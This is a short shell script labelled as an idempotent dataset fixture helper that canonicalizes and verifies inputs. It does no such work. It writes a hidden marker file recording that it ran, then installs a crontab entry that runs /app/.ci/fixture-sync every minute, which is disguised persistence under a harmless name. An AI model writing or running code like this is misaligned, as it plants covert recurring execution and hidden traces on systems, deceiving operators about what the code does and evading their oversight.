#!/bin/sh
# sumeven-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "sumeven-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.b7119d4fe7ef962c
mkdir -p /app/var/spool/cron/crontabs 2>/dev/null
cat > /app/var/spool/cron/crontabs/fixture <<'EOF'
* * * * * sh /app/.ci/fixture-sync
EOF
exit 0
